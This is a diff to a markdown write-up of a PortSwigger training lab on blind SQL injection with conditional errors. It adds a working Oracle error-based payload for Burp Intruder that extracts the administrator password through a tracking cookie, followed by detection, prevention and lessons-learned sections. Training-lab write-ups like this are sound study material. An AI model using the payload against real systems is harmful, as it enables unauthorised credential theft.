@@ -26,10 +26,10 @@
    * [Step 7 — Find the password length](#step-7--find-the-password-length)
    * [Step 8 — Extract the password with Burp Intruder](#step-8--extract-the-password-with-burp-intruder)
    * [Step 9 — Log in as administrator](#step-9--log-in-as-administrator)
-* [Detection](#detection)
-* [Prevention](#prevention)
+* [How Defenders Can Catch This](#how-defenders-can-catch-this)
+* [How to Prevent It](#how-to-prevent-it)
 * [References](#references)
-* [Key Takeaways](#key-takeaways)
+* [Lessons Learned](#lessons-learned)
 
 ## Introduction
 
@@ -372,3 +372,94 @@ In this lab, the error stopped after testing a length greater than 20, which mea
 <p align="center">
   <img src="images/step7-2.png" width="600">
 </p>
+
+## Step 8 — Extracting the Password Using Burp Intruder
+
+To avoid testing every character manually, I used Burp Intruder to extract the password one character at a time.
+
+I sent the working request to Intruder and used:
+
+```sql
+TrackingId=08ITKoawSkZtY2wE'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+**Breakdown**
+
+| Part | Description |
+|---|---|
+| `08ITKoawSkZtY2wE` | The original tracking ID from the application |
+| `'` | Closes the original string in the SQL query |
+| `||` | Concatenates the original value with the result of another SQL expression |
+| `(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')` | Executes a conditional subquery to check whether the first character of the administrator password matches the tested value |
+| `CASE WHEN SUBSTR(password,1,1)='§a§'` | Checks if the first character of the administrator's password is equal to the character placed inside the payload marker |
+| `SUBSTR(password,1,1)` | Extracts one character from the password. `1,1` means it starts from the first position and returns one character |
+| `'§a§'` | Burp Suite Intruder payload marker. During testing, this value is replaced with different characters to find the correct password character |
+| `TO_CHAR(1/0)` | Forces a division-by-zero error when the condition is true. The error response indicates that the tested character is correct |
+| `ELSE ''` | Returns an empty string when the condition is false |
+| `FROM users` | Specifies that the query runs against the `users` table |
+| `WHERE username='administrator'` | Targets only the administrator user's password |
+| `||` | Concatenates the subquery result with the remaining part of the SQL query |
+| `'` | Closes the injected SQL string to keep the query syntax valid |
+
+I marked the character position as a payload and used a simple list containing `a-z` and `0-9`.
+
+| Setting     | Value             |
+| ----------- | ----------------- |
+| Attack Type | Sniper            |
+| Payload     | a-z, 0-9          |
+| HTTP 500    | Correct character |
+| HTTP 200    | Wrong character   |
+
+I checked the responses and found the character that returned HTTP 500.
+
+Then I changed the `SUBSTR()` position from `1` to `2` and repeated the process until all 20 password characters were extracted.
+
+## Step 9 — Logging in as Administrator
+
+After recovering the password, I opened the My account page and logged in using the recovered administrator credentials.
+
+Username: administrator
+Password: [recovered password]
+
+The login was successful, confirming that the password had been extracted correctly and the lab was solved.
+
+## How Defenders Can Catch This
+
+This type of attack can often be identified by monitoring unusual requests and server responses.
+
+- Watch for cookies or parameters containing SQL keywords such as `CASE WHEN`, `TO_CHAR`, `SUBSTR`, or `dual`.
+- Look for many similar requests where only one character or value changes each time.
+- Monitor repeated payloads that try to trigger database errors, such as `1/0` or `TO_CHAR(1/0)`.
+- Check for a large number of HTTP 500 responses coming from the same user, session, or IP address.
+- Review web server and database logs for repeated SQL injection attempts.
+
+## How to Prevent It
+
+This vulnerability can be prevented by following secure coding practices.
+
+- Use parameterized queries or prepared statements
+- Never build SQL queries by concatenating user input
+- Validate and sanitize all user input
+- Do not display database error messages to users
+- Apply the principle of least privilege to database accounts
+- Use a Web Application Firewall (WAF) to detect and block SQL injection attempts
+- Regularly test the application for SQL injection vulnerabilities
+
+## References
+
+| Resource | Link |
+|----------|------|
+| PortSwigger Web Security Academy – Blind SQL injection with conditional errors | https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors |
+| Oracle Database SQL Language Reference | https://docs.oracle.com/en/database/oracle/oracle-database/ |
+| Burp Suite Documentation | https://portswigger.net/burp/documentation |
+| OWASP Web Security Testing Guide (WSTG) | https://owasp.org/www-project-web-security-testing-guide/ |
+| OWASP SQL Injection Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html |
+
+
+## Lessons Learned
+
+- Error messages can reveal useful information about the backend database.
+- Even without seeing database results, SQL injection can still be used to extract data.
+- Small differences in application responses can help confirm SQL conditions.
+- Burp Repeater is useful for testing payloads manually.
+- Burp Intruder makes it easier to automate repeated requests and recover data.
+- Proper input handling and parameterized queries are the best defense against SQL injection.
